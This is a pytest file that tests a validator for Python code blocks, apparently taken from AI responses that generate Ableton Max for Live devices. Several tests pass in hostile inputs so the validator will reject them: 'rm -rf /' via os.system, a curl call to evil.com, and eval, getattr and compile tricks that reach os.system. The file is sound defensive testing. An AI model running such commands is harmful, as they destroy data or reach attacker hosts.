"""Tests for code extraction and validation."""

import pytest
from app.core.extractor import extract_code, ExtractionError


class TestExtractCode:
    def test_extracts_python_block(self):
        response = '''Here's your plugin:

```python
import maxpylang as mp
patch = mp.MaxPatch()
patch.set_position(30, 65)
plugout = patch.place("plugout~")[0]
patch.save("device.amxd", device_type="audio_effect")
```

Drag it into Ableton!'''

        code = extract_code(response)
        assert "import maxpylang" in code
        assert "MaxPatch" in code
        assert "plugout~" in code

    def test_picks_longest_block(self):
        response = '''Here's a helper:

```python
x = 1
```

And the full script:

```python
import maxpylang as mp
patch = mp.MaxPatch()
patch.set_position(30, 65)
plugout = patch.place("plugout~")[0]
patch.save("device.amxd", device_type="audio_effect")
```
'''
        code = extract_code(response)
        assert "import maxpylang" in code

    def test_no_code_block_raises(self):
        with pytest.raises(ExtractionError, match="No Python code block"):
            extract_code("Here's your plugin, just drag it in!")

    def test_missing_maxpylang_import_raises(self):
        response = '''```python
x = 1
plugout = "plugout~"
something.save("x.amxd")
```'''
        with pytest.raises(ExtractionError, match="does not import maxpylang"):
            extract_code(response)

    def test_missing_plugout_raises(self):
        response = '''```python
import maxpylang as mp
patch = mp.MaxPatch()
patch.save("device.amxd")
```'''
        with pytest.raises(ExtractionError, match="no M4L output"):
            extract_code(response)

    def test_missing_save_raises(self):
        response = '''```python
import maxpylang as mp
patch = mp.MaxPatch()
patch.place("plugout~")
```'''
        with pytest.raises(ExtractionError, match="does not save"):
            extract_code(response)

    def test_dangerous_os_system_rejected(self):
        response = '''```python
import maxpylang as mp
import os
os.system("rm -rf /")
patch = mp.MaxPatch()
patch.place("plugout~")
patch.save("device.amxd")
```'''
        with pytest.raises(ExtractionError, match="forbidden pattern"):
            extract_code(response)

    def test_dangerous_subprocess_rejected(self):
        response = '''```python
import maxpylang as mp
import subprocess
subprocess.run(["curl", "evil.com"])
patch = mp.MaxPatch()
patch.place("plugout~")
patch.save("device.amxd")
```'''
        with pytest.raises(ExtractionError, match="forbidden pattern"):
            extract_code(response)

    def test_dangerous_eval_rejected(self):
        response = '''```python
import maxpylang as mp
eval("__import__('os').system('ls')")
patch = mp.MaxPatch()
patch.place("plugout~")
patch.save("device.amxd")
```'''
        with pytest.raises(ExtractionError, match="forbidden pattern"):
            extract_code(response)

    def test_dangerous_getattr_rejected(self):
        response = '''```python
import maxpylang as mp
getattr(__builtins__, '__import__')('os').system('ls')
patch = mp.MaxPatch()
patch.place("plugout~")
patch.save("device.amxd")
```'''
        with pytest.raises(ExtractionError, match="forbidden pattern"):
            extract_code(response)

    def test_dangerous_compile_rejected(self):
        response = '''```python
import maxpylang as mp
code = compile("print('hacked')", "<string>", "exec")
patch = mp.MaxPatch()
patch.place("plugout~")
patch.save("device.amxd")
```'''
        with pytest.raises(ExtractionError, match="forbidden pattern"):
            extract_code(response)

    def test_save_amxd_pattern_accepted(self):
        response = '''```python
import maxpylang as mp
patch = mp.MaxPatch()
patch.place("plugout~")
patch.save("device.maxpat")
from amxd import save_amxd
save_amxd(patch.get_json(), "device.amxd", device_type="audio_effect")
```'''
        code = extract_code(response)
        assert "save_amxd" in code
